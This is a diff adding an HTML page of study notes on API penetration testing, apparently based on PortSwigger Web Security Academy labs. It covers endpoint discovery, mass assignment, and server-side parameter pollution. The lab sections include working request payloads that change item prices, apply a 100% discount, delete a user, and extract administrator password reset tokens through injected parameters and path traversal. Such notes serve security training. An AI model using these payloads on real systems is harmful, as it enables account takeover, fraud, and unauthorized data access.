@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>API-Testing</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header id="title-block-header">
+</header>
+<h1 id="api-testing">API Testing</h1>
+<p><br></p>
+<h2 id="summary">Summary</h2>
+<!-- MarkdownTOC -->
+<ul>
+<li><a href="#api-recon">API Recon</a></li>
+<li><a href="#api-documentation">API Documentation</a>
+<ul>
+<li><a href="#lab-exploiting-an-api-endpoint-using-documentation">Lab:
+Exploiting an API endpoint using documentation</a></li>
+</ul></li>
+<li><a href="#identifying-api-endpoints">Identifying API endpoints</a>
+<ul>
+<li><a href="#lab-finding-and-exploiting-an-unused-api-endpoint">Lab:
+Finding and exploiting an unused API endpoint</a></li>
+</ul></li>
+<li><a href="#finding-hidden-parameters">Finding hidden
+parameters</a></li>
+<li><a href="#mass-assignment-vulnerabilities">Mass Assignment
+Vulnerabilities</a>
+<ul>
+<li><a href="#lab-exploiting-a-mass-assignment-vulnerability">Lab:
+Exploiting a mass assignment vulnerability</a></li>
+</ul></li>
+<li><a href="#server-side-parameter-pollution">Server-side parameter
+pollution</a>
+<ul>
+<li><a
+href="#testing-for-server-side-parameter-pollution-in-the-query-string">Testing
+for server-side parameter pollution in the query string</a>
+<ul>
+<li><a
+href="#lab-exploiting-server-side-parameter-pollution-in-a-query-string">Lab:
+Exploiting server-side parameter pollution in a query string</a></li>
+</ul></li>
+<li><a
+href="#testing-for-server-side-parameter-pollution-in-rest-paths">Testing
+for server-side parameter pollution in REST paths</a>
+<ul>
+<li><a
+href="#lab-exploiting-server-side-parameter-pollution-in-a-rest-url">Lab:
+Exploiting server-side parameter pollution in a REST URL</a></li>
+</ul></li>
+<li><a
+href="#testing-for-server-side-parameter-pollution-in-structured-data-formats">Testing
+for server-side parameter pollution in structured data formats</a></li>
+<li><a href="#testing-with-automated-tools">Testing with automated
+tools</a></li>
+</ul></li>
+</ul>
+<!-- /MarkdownTOC -->
+<p><br><br></p>
+<h3 id="api-recon">API Recon</h3>
+<ul>
+<li><p>To start API testing, you first need to find out as much
+information about the API as possible, to discover its attack
+surface.</p></li>
+<li><p>To begin, you should identify API endpoints. These are locations
+where an API receives requests about a specific resource on its
+server.</p></li>
+<li><p>Example:</p></li>
+</ul>
+<pre><code>GET /api/books HTTP/1.1
+Host: example.com</code></pre>
+<ul>
+<li><p>Once you have identified the endpoints, you need to determine how
+to interact with them. This enables you to construct valid HTTP requests
+to test the API.</p>
+<ul>
+<li><p>The input data the API processes, including both compulsory and
+optional parameters.</p></li>
+<li><p>The types of requests the API accepts, including supported HTTP
+methods and media formats.</p></li>
+<li><p>Rate limits and authentication mechanisms.</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="api-documentation">API Documentation</h3>
+<ul>
+<li><p>Even if API documentation isn’t openly available, you may still
+be able to access it by browsing applications that use the API.</p></li>
+<li><p>Look for endpoints that may refer to API documentation, for
+example:</p>
+<ul>
+<li><p>/api</p></li>
+<li><p>/swagger/index.html</p></li>
+<li><p>/openapi.json</p></li>
+</ul></li>
+<li><p>If you identify an endpoint for a resource, make sure to
+investigate the base path.</p>
+<ul>
+<li><p>/api/swagger/v1/users/123</p></li>
+<li><p>/api/swagger/v1</p></li>
+<li><p>/api/swagger</p></li>
+<li><p>/api</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<p>Using machine-readable documentation</p>
+<ul>
+<li>https://portswigger.net/web-security/api-testing#using-machine-readable-documentation</li>
+</ul>
+<p><br><br></p>
+<h4 id="lab-exploiting-an-api-endpoint-using-documentation">Lab:
+Exploiting an API endpoint using documentation</h4>
+<ul>
+<li><p>Using all of the functionality that is available in the
+application uncovers an API endpoint when updating the user’s email
+address:</p>
+<ul>
+<li>/api/user/wiener</li>
+</ul></li>
+<li><p>Request the base API path, discloses the API’s functionality in
+the response:</p>
+<ul>
+<li>/api/</li>
+</ul></li>
+<li><p>API to delete the user carlos: (HTTP method DELETE is used)</p>
+<ul>
+<li>DELETE /api/user/carlos</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="identifying-api-endpoints">Identifying API endpoints</h3>
+<ul>
+<li><p>Review any JavaScript files as these can disclose API
+functionality</p></li>
+<li><p>Look for any suggested API endpoints like - /api</p></li>
+<li><p>Change the HTTP method and media type (Content-Type header /
+request body) when requesting the API to determine what is accepted and
+each endpoint</p></li>
+<li><p>As you interact with the API endpoints, review error messages and
+other responses closely. Sometimes these include information that you
+can use to construct a valid HTTP request.</p></li>
+</ul>
+<p><br></p>
+<ul>
+<li><p>An API endpoint may support different HTTP methods. It’s
+therefore important to test all potential methods when you’re
+investigating API endpoints. This may enable you to identify additional
+endpoint functionality, opening up more attack surface.</p></li>
+<li><p>For example, the endpoint /api/tasks may support the following
+methods:</p>
+<ul>
+<li><p>GET /api/tasks - Retrieves a list of tasks.</p></li>
+<li><p>POST /api/tasks - Creates a new task.</p></li>
+<li><p>DELETE /api/tasks/1 - Deletes a task.</p></li>
+</ul></li>
+</ul>
+<p>Note</p>
+<p>When testing different HTTP methods, target low-priority objects.
+This helps make sure that you avoid unintended consequences, for example
+altering critical items or creating excessive records.</p>
+<p><br></p>
+<ul>
+<li><p>Changing the media type for the requests can disclose the
+following:</p>
+<ul>
+<li><p>Trigger errors that disclose useful information.</p></li>
+<li><p>Bypass flawed defenses.</p></li>
+<li><p>Take advantage of differences in processing logic. For example,
+an API may be secure when handling JSON data but susceptible to
+injection attacks when dealing with XML.</p></li>
+</ul></li>
+</ul>
+<p><br></p>
+<ul>
+<li><p>Use Burp Intruder to find hidden API endpoints</p></li>
+<li><p>For example, fuzz the last resource in the following path:</p>
+<ul>
+<li>/api/user/update</li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h4 id="lab-finding-and-exploiting-an-unused-api-endpoint">Lab: Finding
+and exploiting an unused API endpoint</h4>
+<ul>
+<li><p>Use all of the application’s functionality that is
+available</p></li>
+<li><p>When selecting an item to place in our cart, the following API
+endpoint is disclosed</p>
+<ul>
+<li>/api/products/1/price</li>
+</ul></li>
+<li><p>Send this request to Burp Repeater and change the HTTP method to
+identify which ones are accepted by the application</p></li>
+<li><p>The PATCH method was the one that was accepted, and the
+application required that application/json media type to be
+used</p></li>
+<li><p>The following request successfully changed the price of the item
+to 5 cents:</p></li>
+</ul>
+<pre><code>PATCH /api/products/1/price HTTP/2
+Content-Type: application/json
+Content-Length: 11
+REDACTED...
+
+{
+    &quot;price&quot;:5
+}</code></pre>
+<p><br><br></p>
+<h3 id="finding-hidden-parameters">Finding hidden parameters</h3>
+<ul>
+<li><p>Burp includes numerous tools that can help you identify hidden
+parameters:</p>
+<ul>
+<li><p>Burp Intruder enables you to automatically discover hidden
+parameters, using a wordlist of common parameter names to replace
+existing parameters or add new parameters.</p></li>
+<li><p>The Param miner BApp enables you to automatically guess up to
+65,536 param names per request. Param miner automatically guesses names
+that are relevant to the application, based on information taken from
+the scope.</p></li>
+<li><p>The Content discovery tool enables you to discover content that
+isn’t linked from visible content that you can browse to, including
+parameters.</p></li>
+</ul></li>
+</ul>
+<p><br><br></p>
+<h3 id="mass-assignment-vulnerabilities">Mass Assignment
+Vulnerabilities</h3>
+<ul>
+<li><p>Since mass assignment creates parameters from object fields, you
+can often identify these hidden parameters by manually examining objects
+returned by the API.</p></li>
+<li><p>For example, consider a PATCH /api/users/ request, which enables
+users to update their username and email, and includes the following
+JSON:</p></li>
+</ul>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;username&quot;</span><span class="fu">:</span> <span class="st">&quot;wiener&quot;</span><span class="fu">,</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;email&quot;</span><span class="fu">:</span> <span class="st">&quot;wiener@example.com&quot;</span><span class="fu">,</span></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li>A concurrent GET /api/users/123 request returns the following
+JSON:</li>
+</ul>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;id&quot;</span><span class="fu">:</span> <span class="dv">123</span><span class="fu">,</span></span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;John Doe&quot;</span><span class="fu">,</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;email&quot;</span><span class="fu">:</span> <span class="st">&quot;john@example.com&quot;</span><span class="fu">,</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;isAdmin&quot;</span><span class="fu">:</span> <span class="st">&quot;false&quot;</span></span>
+<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>This may indicate that the hidden id and isAdmin parameters are
+bound to the internal user object, alongside the updated username and
+email parameters.</p></li>
+<li><p>Try to include the additional fields in the PATCH method or
+whatever state-changing methods are available in the application and
+identify how the application responds.</p></li>
+</ul>
+<p><br><br></p>
+<h4 id="lab-exploiting-a-mass-assignment-vulnerability">Lab: Exploiting
+a mass assignment vulnerability</h4>
+<ul>
+<li><p>Use all the functionality that is available from the application
+to populate Burp’s HTTP history so it can be reviewed</p></li>
+<li><p>After going through the process of adding an item into our cart
+and placing an order, the following API endpoints are
+processed:</p></li>
+<li><p>GET /api/checkout</p></li>
+<li><p>The GET request returns the following information in the
+response:</p></li>
+</ul>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;chosen_discount&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;percentage&quot;</span><span class="fu">:</span> <span class="dv">0</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;chosen_products&quot;</span><span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;product_id&quot;</span><span class="fu">:</span> <span class="st">&quot;1&quot;</span><span class="fu">,</span></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;name&quot;</span><span class="fu">:</span> <span class="st">&quot;Lightweight </span><span class="ch">\&quot;</span><span class="st">l33t</span><span class="ch">\&quot;</span><span class="st"> Leather Jacket&quot;</span><span class="fu">,</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;quantity&quot;</span><span class="fu">:</span> <span class="dv">1</span><span class="fu">,</span></span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;item_price&quot;</span><span class="fu">:</span> <span class="dv">133700</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>  <span class="ot">]</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li><p>POST /api/checkout</p></li>
+<li><p>The request body contains this information:</p></li>
+</ul>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;chosen_products&quot;</span><span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;product_id&quot;</span><span class="fu">:</span> <span class="st">&quot;1&quot;</span><span class="fu">,</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;quantity&quot;</span><span class="fu">:</span> <span class="dv">1</span></span>
+<span id="cb6-6"><a href="#cb6-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb6-7"><a href="#cb6-7" aria-hidden="true" tabindex="-1"></a>  <span class="ot">]</span></span>
+<span id="cb6-8"><a href="#cb6-8" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<p><br></p>
+<ul>
+<li>Submit the following payload in using the POST /api/checkout request
+to purchase the item for free:</li>
+</ul>
+<div class="sourceCode" id="cb7"><pre
+class="sourceCode json"><code class="sourceCode json"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a><span class="fu">{</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;chosen_discount&quot;</span><span class="fu">:</span> <span class="fu">{</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>    <span class="dt">&quot;percentage&quot;</span><span class="fu">:</span> <span class="dv">100</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>  <span class="fu">},</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>  <span class="dt">&quot;chosen_products&quot;</span><span class="fu">:</span> <span class="ot">[</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>    <span class="fu">{</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;product_id&quot;</span><span class="fu">:</span> <span class="st">&quot;1&quot;</span><span class="fu">,</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>      <span class="dt">&quot;quantity&quot;</span><span class="fu">:</span> <span class="dv">1</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>    <span class="fu">}</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>  <span class="ot">]</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a><span class="fu">}</span></span></code></pre></div>
+<ul>
+<li>We were able to exploit a mass assignment vulnerability in the
+application by including the “discount percentage” information in the
+request to place/purchase the order.</li>
+</ul>
+<p><br><br><br></p>
+<h3 id="server-side-parameter-pollution">Server-side parameter
+pollution</h3>
+<ul>
+<li><p>Some systems contain internal APIs that aren’t directly
+accessible from the internet. Server-side parameter pollution occurs
+when a website embeds user input in a server-side request to an internal
+API without adequate encoding. This means that an attacker may be able
+to manipulate or inject parameters, which may enable them to, for
+example:</p>
+<ul>
+<li><p>Override existing parameters.</p></li>
+<li><p>Modify the application behavior.</p></li>
+<li><p>Access unauthorized data.</p></li>
+</ul></li>
+<li><p>You can test any user input for any kind of parameter pollution.
+For example, query parameters, form fields, headers, and URL path
+parameters may all be vulnerable.</p></li>
+</ul>
+<p>Note</p>
+<p>This vulnerability is sometimes called HTTP parameter pollution.
+However, this term is also used to refer to a web application firewall
+(WAF) bypass technique. To avoid confusion, in this topic we’ll only
+refer to server-side parameter pollution.</p>
+<p>In addition, despite the similar name, this vulnerability class has
+very little in common with server-side prototype pollution.</p>
+<p><br></p>
+<h4
+id="testing-for-server-side-parameter-pollution-in-the-query-string">Testing
+for server-side parameter pollution in the query string</h4>
+<ul>
+<li><p>To test for server-side parameter pollution in the query string,
+place query syntax characters like #, &amp;, and = in your input and
+observe how the application responds.</p></li>
+<li><p>Truncating query strings</p></li>
+<li><p>You can use a URL-encoded # character to attempt to truncate the
+server-side request.</p></li>
+</ul>
+<pre><code>GET /userSearch?name=peter%23foo&amp;back=/home</code></pre>
+<ul>
+<li>The front-end will try to access the following URL:</li>
+</ul>
+<pre><code>GET /users/search?name=peter#foo&amp;publicProfile=true</code></pre>
+<ul>
+<li><p>Review the response for clues about whether the query has been
+truncated. For example, if the response returns the user peter, the
+server-side query may have been truncated. If an Invalid name error
+message is returned, the application may have treated foo as part of the
+username. This suggests that the server-side request may not have been
+truncated.</p></li>
+<li><p>If you’re able to truncate the server-side request, this removes
+the requirement for the publicProfile field to be set to true. You may
+be able to exploit this to return non-public user profiles.</p></li>
+</ul>
+<p><br></p>
+<p>Note</p>
+<p>It’s essential that you URL-encode the # character. Otherwise the
+front-end application will interpret it as a fragment identifier and it
+won’t be passed to the internal API.</p>
+<p><br></p>
+<h5
+id="lab-exploiting-server-side-parameter-pollution-in-a-query-string">Lab:
+Exploiting server-side parameter pollution in a query string</h5>
+<ul>
+<li><p>Submit fuzzing payloads to identify application
+behavior:</p></li>
+<li><p>The following payload returned a “Parameter is not supported”
+message, which indicates that the injected parameter was processed by
+the backend API:</p></li>
+</ul>
+<pre><code>csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&amp;username=administrator%26id=test</code></pre>
+<ul>
+<li>The following payload returned a “Field not specified” message:</li>
+</ul>
+<pre><code>csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&amp;username=administrator%23test</code></pre>
+<ul>
+<li>The following payload returned the email for the provided username:
+(here we are using the “field” parameter that the application previously
+mentioned)</li>
+</ul>
+<pre><code>csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&amp;username=administrator%26field=email%23</code></pre>
+<ul>
+<li>The following payload allowed us to get the “reset_token” value for
+the administrator user, the parameter name (reset_token) was found by
+reading through a JavaScript file exposed in the application:</li>
+</ul>
+<pre><code>
+csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&amp;username=administrator%26field=reset_token%23</code></pre>
+<ul>
+<li>Decoded version:</li>
+</ul>
+<pre><code>csrf=VlaNiS8DCwtHUAzh7m5tsBzmxx5lWd4T&amp;username=administrator&amp;field=reset_token#</code></pre>
+<ul>
+<li>Finally submit this request for the application to successfully
+reset the password for the administrator user:</li>
+</ul>
+<pre><code>GET /forgot-password?reset_token=TOKEN-VALUE HTTP/2</code></pre>
+<p><br><br></p>
+<h4
+id="testing-for-server-side-parameter-pollution-in-rest-paths">Testing
+for server-side parameter pollution in REST paths</h4>
+<ul>
+<li>Consider an application that enables you to edit user profiles based
+on their username. Requests are sent to the following endpoint:</li>
+</ul>
+<pre><code>GET /edit_profile.php?name=peter</code></pre>
+<ul>
+<li>This results in the following server-side request:</li>
+</ul>
+<pre><code>GET /api/private/users/peter</code></pre>
+<ul>
+<li><p>An attacker may be able to manipulate server-side URL path
+parameters to exploit the API. To test for this vulnerability, add path
+traversal sequences to modify parameters and observe how the application
+responds.</p></li>
+<li><p>You could submit URL-encoded peter/../admin as the value of the
+name parameter:</p></li>
+</ul>
+<pre><code>GET /edit_profile.php?name=peter%2f..%2fadmin</code></pre>
+<ul>
+<li>This may result in the following server-side request:</li>
+</ul>
+<pre><code>GET /api/private/users/peter/../admin</code></pre>
+<p><br></p>
+<h5
+id="lab-exploiting-server-side-parameter-pollution-in-a-rest-url">Lab:
+Exploiting server-side parameter pollution in a REST URL</h5>
+<ul>
+<li>The following request is vulnerable to parameter pollution:
+(username - parameter)</li>
+</ul>
+<pre><code>POST /forgot-password HTTP/2
+REDACTED...
+
+csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&amp;username=administrator</code></pre>
+<p>The following steps were taken to identify the vulnerability and
+exploit it to gain access to the admin account:</p>
+<ul>
+<li>This payload returned a different response than the previous
+requests:</li>
+</ul>
+<pre><code>csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&amp;username=administrator/../../../../../</code></pre>
+<ul>
+<li>This payload still returns the normal response, this indicates that
+the application is processing the path traversal inputs:</li>
+</ul>
+<pre><code>csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&amp;username=administrator/../administrator</code></pre>
+<ul>
+<li>The following payload returns a verbose error message that discloses
+the structure of the internal API:</li>
+</ul>
+<pre><code>csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&amp;username=../../../../openapi.json%23</code></pre>
+<ul>
+<li>Decoded version:</li>
+</ul>
+<pre><code>csrf=63i3nSUwifBDmAYAnYtmxk2TP6EMFT8V&amp;username=administrator/../../../../../openapi.json#</code></pre>
+<ul>
+<li>The following payload will return the “password reset token” for the
+administrator user. The variable name (passwordResetToken) was found in
+a JavaScript file.</li>
+</ul>
+<pre><code>csrf=NpAyxU8sqRJrZ5KvnR0WzVLBYTnV3Kt8&amp;username=../../../../api/internal/v1/users/administrator/field/passwordResetToken%23</code></pre>
+<p><br><br></p>
+<h4
+id="testing-for-server-side-parameter-pollution-in-structured-data-formats">Testing
+for server-side parameter pollution in structured data formats</h4>
+<ul>
+<li>Review the examples in this section -
+https://portswigger.net/web-security/api-testing/server-side-parameter-pollution#testing-for-server-side-parameter-pollution-in-structured-data-formats</li>
+</ul>
+<p><br><br></p>
+<h4 id="testing-with-automated-tools">Testing with automated tools</h4>
+<ul>
+<li><p>Burp Scanner automatically detects suspicious input
+transformations when performing an audit.</p></li>
+<li><p>You can also use the Backslash Powered Scanner BApp to identify
+server-side injection vulnerabilities.</p></li>
+</ul>
+</body>
+</html>
